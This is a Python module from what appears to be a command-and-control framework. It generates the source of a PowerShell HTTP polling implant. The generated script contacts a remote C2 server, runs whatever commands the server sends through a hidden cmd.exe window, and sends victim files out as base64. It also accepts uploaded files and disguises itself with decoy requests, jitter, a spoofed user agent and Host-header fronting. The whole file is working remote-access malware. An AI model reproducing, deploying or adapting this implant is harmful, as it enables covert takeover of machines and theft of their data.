#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""PowerShell HTTP polling agent script builder (compatible with reverse_http_polling)."""

from __future__ import annotations

from typing import Iterable, List, Optional

from lib.c2.beacon_profile import BeaconProfile


def build_powershell_http_polling_script(
    host: str,
    port: int,
    client_id: str,
    *,
    url_prefix: str = "/c2",
    use_ssl: bool = False,
    profile: Optional[BeaconProfile] = None,
    typed_tasks: bool = False,
    user_agent: str = "Mozilla/5.0",
    host_header: str = "",
    payload_comms_host: str = "",
    poll_interval: float = 10.0,
    jitter_percent: float = 35.0,
    cover_traffic: bool = True,
    kill_date: str = "",
    working_hours: str = "",
    sleep_outside_hours: float = 3600.0,
    decoy_paths: Optional[Iterable[str]] = None,
) -> str:
    """Return PowerShell source for an HTTP polling implant."""
    if profile is not None:
        bake = profile.agent_bake_dict()
        poll_interval = float(bake["poll_interval"])
        jitter_percent = float(bake["jitter_percent"])
        cover_traffic = bool(bake["cover_traffic"])
        kill_date = str(bake["kill_date"] or "")
        working_hours = str(bake["working_hours"] or "")
        sleep_outside_hours = float(bake["sleep_outside_hours"])
        user_agent = str(bake["user_agent"] or "Mozilla/5.0")
        host_header = str(bake["host_header"] or "")
        payload_comms_host = str(bake["payload_comms_host"] or "")
        if profile.decoy_paths:
            decoy_paths = list(profile.decoy_paths)

    scheme = "https" if use_ssl else "http"
    prefix = "/" + str(url_prefix or "/c2").strip("/")
    decoys: List[str] = list(
        decoy_paths or ["/", "/favicon.ico", "/robots.txt", "/health", "/api/status"]
    )
    connect_host = str(payload_comms_host or host).strip() or str(host)
    if int(port) in (80, 443):
        base = f"{scheme}://{connect_host}"
    else:
        base = f"{scheme}://{connect_host}:{int(port)}"

    decoys_ps = "@(" + ",".join("'{0}'".format(p.replace("'", "''")) for p in decoys) + ")"
    typed = "$true" if typed_tasks else "$false"

    def esc(s: str) -> str:
        return str(s or "").replace("'", "''")

    return f"""
$ErrorActionPreference='SilentlyContinue'
$BASE='{esc(base)}'
$PREFIX='{esc(prefix)}'
$CID='{esc(client_id)}'
$POLL=[double]{float(poll_interval)}
$JIT=[double]{float(jitter_percent)}
$COVER=[bool]${str(bool(cover_traffic)).lower()}
$DECOYS={decoys_ps}
$KILL='{esc(kill_date)}'
$HOURS='{esc(working_hours)}'
$OUTSIDE=[double]{float(sleep_outside_hours or 3600)}
$UA='{esc(user_agent or "Mozilla/5.0")}'
$HOSTHDR='{esc(host_header)}'
$TYPED={typed}
$Files=@()
function B64([string]$s){{ [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes([string]$s)) }}
function B64D([string]$s){{ [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String([string]$s)) }}
function SleepJ($hint,$outside=$false){{
  $b=if($outside){{ [Math]::Max(0.5,$OUTSIDE) }} else {{ [Math]::Max(0.5,$POLL) }}
  $j=[Math]::Max(0.0,[Math]::Min(100.0,$JIT))/100.0
  if($outside){{ $j=[Math]::Min($j,0.15) }}
  $d=if($hint -and [double]$hint -gt 0){{ [double]$hint }} else {{ $b }}
  $r=(Get-Random -Minimum -1000 -Maximum 1000)/1000.0
  Start-Sleep -Seconds ([Math]::Max(0.5, $d + $d * $j * $r))
}}
function PastKill(){{
  if(-not $KILL){{ return $false }}
  try {{
    $dt=[datetime]::Parse($KILL, [Globalization.CultureInfo]::InvariantCulture, [Globalization.DateTimeStyles]::AssumeUniversal -bor [Globalization.DateTimeStyles]::AdjustToUniversal)
    return ([datetime]::UtcNow -ge $dt.ToUniversalTime())
  }} catch {{ return $false }}
}}
function InHours(){{
  if(-not $HOURS -or ($HOURS -notmatch '-')){{ return $true }}
  try {{
    $parts=$HOURS.Split('-',2)
    $st=[datetime]::ParseExact($parts[0].Trim(),'HH:mm',$null).TimeOfDay
    $en=[datetime]::ParseExact($parts[1].Trim(),'HH:mm',$null).TimeOfDay
    $cur=(Get-Date).TimeOfDay
    if($st -le $en){{ return ($cur -ge $st -and $cur -le $en) }}
    return ($cur -ge $st -or $cur -le $en)
  }} catch {{ return $true }}
}}
function Req($method,$path,$body=$null,$ctype=$null){{
  $u=$BASE+$path
  $req=[Net.HttpWebRequest]::Create($u)
  $req.Method=$method
  $req.UserAgent=$UA
  $req.Timeout=30000
  if($HOSTHDR){{ $req.Host=$HOSTHDR }}
  if($ctype){{ $req.ContentType=$ctype }}
  if($null -ne $body){{
    $bytes=[Text.Encoding]::UTF8.GetBytes([string]$body)
    $req.ContentLength=$bytes.Length
    $s=$req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
  }}
  $resp=$req.GetResponse()
  $sr=New-Object IO.StreamReader($resp.GetResponseStream())
  $txt=$sr.ReadToEnd(); $sr.Close(); $resp.Close()
  return $txt
}}
function Decoy(){{
  if(-not $COVER){{ return }}
  try {{ $p=$DECOYS | Get-Random; [void](Req 'GET' $p) }} catch {{}}
}}
function RunShell([string]$cmd){{
  try {{
    $psi=New-Object Diagnostics.ProcessStartInfo
    $psi.FileName='cmd.exe'
    $psi.Arguments='/c '+$cmd
    $psi.RedirectStandardOutput=$true
    $psi.RedirectStandardError=$true
    $psi.UseShellExecute=$false
    $psi.CreateNoWindow=$true
    $p=[Diagnostics.Process]::Start($psi)
    $out=$p.StandardOutput.ReadToEnd()+$p.StandardError.ReadToEnd()
    $p.WaitForExit(120000) | Out-Null
    if(-not $out){{ $out='[exit '+$p.ExitCode+']' }}
    return $out
  }} catch {{ return 'ERROR:'+$_.Exception.Message }}
}}
function RunTask($task){{
  $script:Files=@()
  $cname=[string]$task.command
  $targs=$task.args
  if(-not $targs){{ $targs=@{{}} }}
  $out=''; $status='completed'; $die=$false
  try {{
    switch($cname.ToLower()){{
      {{ $_ -in @('shell','cmd') }} {{ $out=RunShell([string]$targs.cmd); break }}
      'pwd' {{ $out=(Get-Location).Path; break }}
      'whoami' {{
        $out=$env:USERNAME
        if($env:USERDOMAIN){{ $out=$env:USERDOMAIN+'\\'+$out }}
        break
      }}
      'ls' {{
        $path=if($targs.path){{ [string]$targs.path }} else {{ '.' }}
        $out=((Get-ChildItem -Force -LiteralPath $path | ForEach-Object {{ $_.Name }}) -join "`n")
        break
      }}
      'cat' {{ $out=Get-Content -Raw -LiteralPath ([string]$targs.path); break }}
      'download' {{
        $path=[string]$targs.path
        $raw=[IO.File]::ReadAllBytes($path)
        $script:Files=@(@{{ path=$path; encoding='base64'; data=[Convert]::ToBase64String($raw) }})
        $out='OK '+$raw.Length+' bytes'
        break
      }}
      'upload' {{
        $path=[string]$targs.path
        [IO.File]::WriteAllBytes($path, [Convert]::FromBase64String([string]$targs.data))
        $out='OK wrote '+$path
        break
      }}
      'exit' {{ $out='bye'; $die=$true; break }}
      default {{ $out=RunShell($cname) }}
    }}
  }} catch {{
    $out='ERROR:'+$_.Exception.Message
    $status='failed'
  }}
  return @{{ out=$out; status=$status; die=$die }}
}}
while($true){{
  try {{
    if(PastKill){{ break }}
    if(-not (InHours)){{ SleepJ $null $true; continue }}
    if($COVER -and ((Get-Random -Maximum 100) -lt 35)){{ Decoy }}
    $q='id='+[uri]::EscapeDataString($CID)
    $raw=Req 'GET' ($PREFIX+'/poll?'+$q)
    $data=$raw | ConvertFrom-Json
    if($data.die){{ break }}
    if($data.ua){{ $UA=[string]$data.ua }}
    if($TYPED){{
      $task=$null
      if($data.PSObject.Properties.Name -contains 'task' -and $data.task){{ $task=$data.task }}
      elseif($data.command){{
        $rawc=$data.command
        if($data.encoding -eq 'base64'){{ try {{ $rawc=B64D([string]$rawc) }} catch {{}} }}
        if($data.encoding -eq 'task'){{
          try {{ $task=$rawc | ConvertFrom-Json }}
          catch {{ $task=[pscustomobject]@{{ command='shell'; args=[pscustomobject]@{{ cmd=[string]$rawc }}; task_id='' }} }}
        }} else {{
          $task=[pscustomobject]@{{ command='shell'; args=[pscustomobject]@{{ cmd=[string]$rawc }}; task_id='' }}
        }}
      }}
      if($task){{
        $r=RunTask $task
        $bodyObj=[ordered]@{{
          output=(B64 $r.out)
          encoding='base64'
          id=$CID
          task_id=([string]$task.task_id)
          status=$r.status
          files=$script:Files
        }}
        $body=($bodyObj | ConvertTo-Json -Compress -Depth 8)
        [void](Req 'POST' ($PREFIX+'/result?'+$q) $body 'application/json')
        if($r.die){{ break }}
      }}
    }} else {{
      $cmd=''
      if($data.command){{
        if($data.encoding -eq 'base64'){{ $cmd=B64D([string]$data.command) }} else {{ $cmd=[string]$data.command }}
      }}
      if($cmd.Trim()){{
        $out=RunShell $cmd
        $body=(@{{ output=(B64 $out); encoding='base64'; id=$CID }} | ConvertTo-Json -Compress)
        [void](Req 'POST' ($PREFIX+'/result?'+$q) $body 'application/json')
      }}
    }}
    SleepJ $data.next_sleep ([bool]$data.outside_hours)
  }} catch {{
    SleepJ $null
  }}
}}
""".strip()
